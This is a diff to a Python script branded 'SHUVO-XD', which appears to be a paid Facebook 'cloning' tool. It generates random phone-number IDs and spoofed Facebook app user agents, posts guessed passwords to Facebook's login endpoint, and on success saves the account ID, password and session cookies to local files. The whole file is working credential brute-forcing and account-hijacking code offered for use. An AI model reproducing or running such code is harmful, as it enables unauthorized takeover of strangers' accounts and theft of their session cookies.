@@ -36,22 +36,34 @@ def generate_random_user_agent():
     user_agent_template = (
         '[FBAN/FB4A;FBAV/{version};FBBV/{version_code};FBDM/{device_density};FBLC/{language};FBRV/{revision};'
         'FBCR/{carrier};FBMF/{manufacturer};FBBD/{brand};FBPN/{package};FBDV/{device};FBSV/{os_version};'
-        'FBOP/{op};FBCA/{cpu_architecture};]')
-    
-    # Randomly generate parts of the user agent string
+        'FBOP/{op};FBCA/{cpu_architecture};SIM/{sim_name};MODEL/{model_name};]')
+
     version = f"{random.randint(11, 99)}.0.0.{random.randint(1111, 9999)}"
     version_code = random.randint(1111111, 9999999)
-    device_density = "density=2.0,width=720,height=1280"
+    device_density = f"{random.choice(['1.0', '1.30625', '1.6', '1.7', '2.0', '2.2', '2.1000001', '2.25', '2.5', '2.8812501', '3.0', '3.0625', '3.5', '3.375'])}"
+ # Example: Set to a specific language code  
     language = "en_GB"
-    revision = 0
-    carrier = "StarHub Mobile"
-    manufacturer = "OPPO"
-    brand = "OPPO"
+  # Example: Set revision number if applicable
+    revision = 11
+   # Example: Set carrier name
+    carrier = "StarHub Mobile" 
+
+    manufacturer = "Redmi"
+    brand = "Xiaomi"
     package = "com.facebook.katana"
     device = "A37f"
     os_version = "5.1.1"
     op = 1
     cpu_architecture = "armeabi-v7a:armeabi"
+
+    # Randomly select SIM name and model name
+    sim_name = random.choice(['Banglalink', 'Robi', 'MTN-CG', 'Grameenphone', 'Artel', 'Teletalk', 'UMobaile', 'Digi'])
+    model_name = random.choice([
+        "CPH2499", "POCOPHONE F1", "CPH2083", "Xiaomi_Mi_Mix_10", "Redmi Note 7 Pro", "CPH2185", "CPH2065",
+        "CPH2197", "CPH1989", "Redmi Note 8", "Redmi Note 9 Pro", "Redmi 8A", "MI PLAY", "OPPO A57", "CPH2145",
+        "Mi Note 10 Lite", "MI PAD 4", "F1w", "Redmi 5 Plus", "CPH1909", "CPH2065", "CPH1937", "CPH2249",
+        "CPH2095", "CPH2083", "CPH1979", "CPH2067", "CPH2015", "CPH2021", "CPH2205", "CPH2207", "CPH1909",
+        "CPH1801", "CPH1911", "CPH1901", "CPH1727", "1201", "Xiaomi"])
 
     return user_agent_template.format(
         version=version,
@@ -66,15 +78,35 @@ def generate_random_user_agent():
         device=device,
         os_version=os_version,
         op=op,
-        cpu_architecture=cpu_architecture)
+        cpu_architecture=cpu_architecture,
+        sim_name=sim_name,
+        model_name=model_name)
 
 predefined_user_agents = [
-    "[FBAN/FB4A;FBAV/167.0.0.33.94;FBBV/101783969;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-    "[FBAN/FB4A;FBAV/63.0.0.37.81;FBBV/21778670;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/MPT;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/1201;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
-    "[FBAN/FB4A;FBAV/167.0.0.33.94;FBBV/101783969;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"]
+    "[FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/366800017;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/367566226;FBCR/Nar;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/366800017;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/367837039;FBCR/Beeline GE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/362.0.0.27.109;FBBV/363388168;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/365529117;FBCR/Ucell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723209;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/351594825;FBCR/MTS Armenia;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542502;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/198442689;FBCR/inwi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/{density=2.75,width=1080,height=2168};FBLC/uk_UA;FBRV/373921892;FBCR/-Auchan Telecom-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/{density=2.75,width=1080,height=2168};FBLC/uk_UA;FBRV/373921892;FBCR/-Auchan Telecom-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/{density=2.75,width=1080,height=2177};FBLC/ru_RU;FBRV/373997919;FBCR/Ucom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633521;FBDM/{density=2.75,width=1080,height=2030};FBLC/ru_RU;FBRV/346178160;FBCR/Plus;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/{density=2.75,width=1080,height=2168};FBLC/uk_UA;FBRV/373921892;FBCR/-Auchan Telecom-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371898012;FBDM/{density=2.75,width=1080,height=2177};FBLC/ru_RU;FBRV/373997919;FBCR/Ucom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633521;FBDM/{density=2.75,width=1080,height=2030};FBLC/ru_RU;FBRV/346178160;FBCR/Plus;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5 Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/357.0.0.23.115;FBBV/355520688;FBDM/{density=2.75,width=1080,height=2130};FBLC/lv_LV;FBRV/357076383;FBCR/#ParMieru;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/358.0.0.34.117;FBBV/356806145;FBDM/{density=1.6,width=720,height=1468};FBLC/es_ES;FBRV/358875016;FBCR/Movistar;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/366800017;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/367333935;FBCR/BITE_LV;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/366800017;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/367566226;FBCR/Nar;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/364.1.0.25.132;FBBV/366800017;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/367837039;FBCR/Beeline GE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
+    "[FBAN/FB4A;FBAV/362.0.0.27.109;FBBV/363388168;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/365529117;FBCR/Ucell;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/353.0.0.34.116;FBBV/349723209;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/351594825;FBCR/MTS Armenia;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
+    "[FBAN/FB4A;FBAV/256.0.0.39.117;FBBV/196542502;FBDM/{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/198442689;FBCR/inwi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"]
 
+# Print all predefined user agents
+for agent in predefined_user_agents:
+    print(agent)
 # Add the generated random user agent to the predefined list
 all_user_agents = [generate_random_user_agent()] + predefined_user_agents
 
@@ -94,31 +126,50 @@ def ___sex___():
 #-----------------------❲ SYS ❳-----------------------#
 sys.stdout.write('\x1b]2; >>SHUVO-XD<<\x07')
 #-----------------------❲ COLOUR ❳-----------------------#
-G = "\x1b[38;5;46m";W = "\x1b[97m";O = "\033[1;33m";B = '\x1b[38;5;8m'
+B = "\033[1;30m";
+R = "\033[1;31m";
+G = "\033[1;32m";
+Y = "\033[1;33m";
+BL = "\033[1;34m";
+P = "\033[1;35m";
+SK = "\033[1;36m";
+W= '\033[1;37m'
 #-----------------------❲ STYLE ❳-----------------------#
-xd=f"{B}❲{G}•{B}❳{W}";xd1=f"{B}❲{G}1{B}❳{W}";xd2=f"{B}❲{G}2{B}❳{W}";xd3=f"{B}❲{G}3{B}❳{W}";xd4=f"{B}❲{G}4{B}❳{W}";xd5=f"{B}❲{G}5{B}❳{W}";xd6=f"{B}❲{G}6{B}❳{W}";xd0=f"{B}❲{G}0{B}❳{W}";xdx=f"{B}❲{G}?{B}❳{W}";xdxx=f"{G}━➤{W}"
+xd=f"{B}❲{G}•{B}❳{W}";xd1=f"{B}❲{G}1{B}❳{W}";xd2=f"{B}❲{G}2{B}❳{W}";xd3=f"{B}❲{G}3{B}❳{W}";xd4=f"{B}❲{G}4{B}❳{W}";xd5=f"{B}❲{G}5{B}❳{W}";xd6=f"{B}❲{G}6{B}❳{W}";xd0=f"{B}❲{G}0{B}❳{W}";xdx=f"{B}❲{G}?{B}❳{W}";xxdx=f"{R}";xdxx=f"{G}━➤{G}"
 #-----------------------❲ CLEAR ❳-----------------------#
 def clear():os.system('clear');print(logo)
 def linex():print(f'{W}──────────────────────────────────────────────────')
 #-----------------------❲ LOGO ❳-----------------------#
 logo=(f"""
-   {W} _______ _     _ _     _ _    _  _____ 
-   {G} |______ |_____| |     |  \  /  |     |
-   {W} ______| |     | |_____|   \/   |_____| 1.0
+
+   {Y} ██████  ██       █████   ██████ ██   ██ 
+   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
+   {Y} ██████  ██      ███████ ██      █████   
+   {Y} ██   ██ ██      ██   ██ ██      ██  ██  
+   {Y} ██████  ███████ ██   ██  ██████ ██   ██  
+  
+   {P} version •••••••••••••••      0.1v                                     
+               
+    {Y}, .  .  ,  ,-.  .   ,   ,-.  ,-.   ,-.  
+    {Y}| |\ |  | /   \  \ /    |  ) |  ) /   \ 
+    {Y}| | \|  | |   |   Y     |-<  |-<  |   | 
+    {Y}| |  |  | \   /   |     |  ) |  \ \   / {R} ••••••••••••••••
+    {Y}' '  ' -'  `-'    '     `-'  '  '  `-'  
+                                        
 {W}──────────────────────────────────────────────────
-{xd} OWNER  {xdxx} SHUVO AHMED
-{xd} TOOLS  {xdxx} FILE {G}X{W} RANDOM CLONING
-{xd} STATUS {xdxx} PAID
+{xdxx} OWNER  {xdxx} SHUVO AHMED
+{xdxx} TOOLS  {xdxx} FILE {G}X{G} RANDOM CLONING
+{xdxx} STATUS {xdxx} PAID
 {W}──────────────────────────────────────────────────""")
 #-----------------------❲ RESULT ❳-----------------------#
 def result(OKs,cps):
     if len(OKs) != 0 or len(cps) != 0:
-        print("");linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETE...');print(f'{xd} TOTAL OK {xdxx} %s' % str(len(oks)));print(f'{xd} TOTAL CP {xdxx} %s' % str(len(cps)));linex();exit()
+        print("");linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETE...');print(f'{xd} TOTAL OK {xdxx} %s' % str(len(oks)));print(f'{xd} TOTAL CP {xxdx} %s' % str(len(cps)));linex();exit()
 #-----------------------❲ MENU ❳-----------------------#
 def ___SHUVO___():
         clear()
-        print(f'{xd1} FILE CLONING ');print(f'{xd2} RANDOM CLONING ');print(f'{xd0} EXIT CLONING ');linex()
-        option = input(f'{xdx} SELECT {xdxx} ')
+        print(f'{xd1} {G}FILE CLONING ');print(f'{xd2} {G}RANDOM CLONING ');print(f'{xd0} {G}EXIT CLONING ');linex()
+        option = input(f'{xdx} SELECT {xxdx} ')
         if option in ['1','A']:___file___()
         elif option in ['2','B']:___random___()
         else:print(f"{xd} OPTION NOT FOUND ");time.sleep(2);___SHUVO___()
@@ -379,6 +430,7 @@ def ___bd2___():
     clear();print(f"{xd} EXAMPLE {xdxx} 017 {G}•{W} 018 {G}•{W} 019 {G}•{W} 016");linex();code = input(f'{xdx} SELECT  {xdxx} ')
     clear();print(f"{xd} EXAMPLE {xdxx} 3000 {G}•{W} 5000 {G}•{W} 9999 {G}•{W} 99999");linex();limit = int(input(f'{xdx} SELECT  {xdxx} '))
     clear();print(f"{xd1} CLONING WITH {B}❲{G}SLOW{B}❳{W}");print(f"{xd2} CLONING WITH {B}❲{G}FAST{B}❳{W}");linex();pasxd = input(f'{xdx} SELECT  {xdxx} ')
+    clear();print(f"{xd} COOKIES SHOW Y{G}|{W}N");linex();xmk = input(f'{xdx} SELECT {xdxx} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -471,6 +523,7 @@ def ___Afghanistan___():
 def ___HOST___(ids,passlist,tl,ck):
     global loop,oks,cps
     sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(oks)} ");sys.stdout.flush(),
+    sys.stdout.write(f"\r{xd} SHUVO-BD {loop}{G}|{W}{len(cps)} ");sys.stdout.flush(),
     sys.stdout.flush()
     session=requests.Session()
     __ua__ = "Mozilla/5.0 (Linux; Android 13; RMX3750 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.136 Mobile Safari/537.36"
@@ -478,7 +531,7 @@ def ___HOST___(ids,passlist,tl,ck):
         for pas in passlist:
             free_fb = session.get('https://free.facebook.com').text
             info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
-            update={'User-Agent': ___swag___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
+            update={'User-Agent': ___sex___(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
             session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -489,8 +542,11 @@ def ___HOST___(ids,passlist,tl,ck):
                 if 'Photoshop' in res:
                     if "Y" in ck:
                         print(f'\r{xd}{G} SHUVO-OK '+cid+' | '+pas+'\033[1;92m')
+                        print(f'\r{xd}{G} SHUVO-CP '+cid+' | '+pas+'\033[1;30m')
                         print(f'\r{xd} COOKIES '+coki+'\x1b[38;5;223m');linex()
                         open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
+                        open('/sdcard/SHUVO-BD-RANDOM-OK.txt','a').write(cid+'|'+pas+'\n')
+                        open('/sdcard/SHUVO-BD-RANDOM-CP.txt','a').write(cid+'|'+pas+'\n')
                         oks.append(cid)
                         break
                     else:
